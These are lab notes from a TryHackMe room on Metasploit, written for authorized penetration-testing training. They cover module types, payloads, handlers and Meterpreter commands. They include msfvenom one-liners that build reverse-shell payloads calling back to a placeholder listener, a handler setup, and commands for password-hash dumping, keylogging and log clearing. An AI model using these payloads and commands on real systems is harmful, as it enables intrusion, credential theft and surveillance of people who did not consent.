# Metasploit Framework — TryHackMe Notes

Hands-on lab notes covering the framework, payload generation, sessions, and credential-cracking tools.

**Room context:** understanding Metasploit for authorized penetration testing.  
**Objective:** learn how modules, payloads, and handlers fit together.

## What is Metasploit?

Metasploit is a modular framework for developing and running exploits against vulnerable systems. It brings scanning, exploitation, payload delivery, and post-exploitation tools into one workspace.

## Core components

- **msfconsole:** the main command-line interface.
- **Modules:** reusable actions for scanning, exploitation, and other tasks.
- **Standalone tools:** utilities such as `msfvenom`, `pattern_create`, and `pattern_offset`.

## Module types

| Type | Purpose |
|---|---|
| Auxiliary | Scanning, enumeration, and other supporting tasks |
| Encoders | Transform payload bytes; encoding alone does not guarantee evasion |
| Evasion | Modules intended to work around particular security controls |
| Exploits | Exercise a vulnerability in a target service or application |
| NOPs | Generate no-operation instructions for payload padding |
| Payloads | Code executed after successful exploitation |
| Post | Tasks performed through an existing session |

### Payload structure

| Type | Description |
|---|---|
| Adapters | Wrap a payload for a different execution context |
| Singles | Self-contained payloads |
| Stagers | Small initial payloads that establish communication and load a stage |
| Stages | Larger payload components delivered after a stager runs |

A useful naming example:

- `shell_reverse_tcp`: a single payload.
- `shell/reverse_tcp`: a staged payload.

## Know your current prompt

| Example prompt | Context | Commands |
|---|---|---|
| `root@ip-10-10-X-X:~#` | Operating-system shell | Normal shell commands |
| `msf6 >` | msfconsole | Framework commands |
| `msf6 exploit(windows/smb/ms17_010_eternalblue) >` | Selected exploit module | Module configuration and framework commands |
| `meterpreter >` | Meterpreter session | Meterpreter commands |
| `C:\Windows\system32>` | Windows shell | Windows commands on that host |

For example, `show options` belongs in msfconsole, not the operating-system shell.

## Port scanning inside Metasploit

Search for available scanner modules:

```text
search portscan
```

Auxiliary scanners can help keep enumeration within the same framework workspace.

## Payload connections

- **Reverse connection:** the target connects back to the handler.
- **Bind connection:** the target listens, and the operator connects to it.
- **HTTP/HTTPS transports:** use those protocols for communication; that does not guarantee they will evade detection.

When a reverse connection fails, check:

1. Handler is running.
2. `LHOST` and `LPORT` match the reachable listener.
3. Routing, NAT, port forwarding, and firewalls permit the connection.

## Payload generation with msfvenom

These examples use lab placeholders. Replace them only with addresses and ports in an authorized environment.

- `LHOST`: the listener address reachable from the target.
- `LPORT`: the listener port.

### Linux ELF

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
chmod +x rev_shell.elf
```

### Windows executable

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```

### PHP

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```

### ASP

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
```

### Python

```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```

## Set up a handler

Configure a matching payload and reachable listener:

```text
use exploit/multi/handler
set payload <payload_type>
set LHOST <your_IP>
set LPORT <your_PORT>
run
```

## Meterpreter command reference

Commands depend on the session type and available privileges.

| Area | Examples |
|---|---|
| Session control | `background`, `exit`, `sessions`, `guid` |
| Files | `ls`, `cd`, `pwd`, `cat`, `edit`, `upload`, `download`, `search`, `rm` |
| Networking | `ifconfig`, `netstat`, `arp`, `portfwd`, `route` |
| System | `sysinfo`, `getuid`, `getpid`, `ps`, `shell`, `execute` |
| Privilege and credentials | `getsystem`, `hashdump` |
| Disruptive actions | `reboot`, `shutdown`, `clearev` |
| Screen and device access | `screenshot`, `screenshare`, `keyscan_start`, `keyscan_dump`, `record_mic`, `webcam_snap` |

Disruptive and collection actions require explicit scope and care even in authorized engagements. Clearing logs can destroy evidence.

## External cracking tools

In labs where hash recovery is part of the exercise:

- **Hashcat:** supports accelerated password recovery.
- **John the Ripper:** supports many hash formats and cracking workflows.

Use lab-provided hashes rather than real credentials or sensitive recovered material in public services.

## Typical lab workflow

1. Enumerate the authorized target.
2. Select and configure an appropriate exploit.
3. Choose a compatible payload and configure its handler.
4. Validate the resulting session.
5. Perform only the post-exploitation tasks permitted by the exercise.
6. Document findings and restore the lab as required.

## Key takeaways

- Check the current prompt before entering commands.
- Match payloads to the target and handler.
- Understand staged and single payloads when troubleshooting.
- Document evidence and explain why each step was taken.
- Keep every activity within the authorized scope.

These notes cover educational TryHackMe environments and authorized testing.
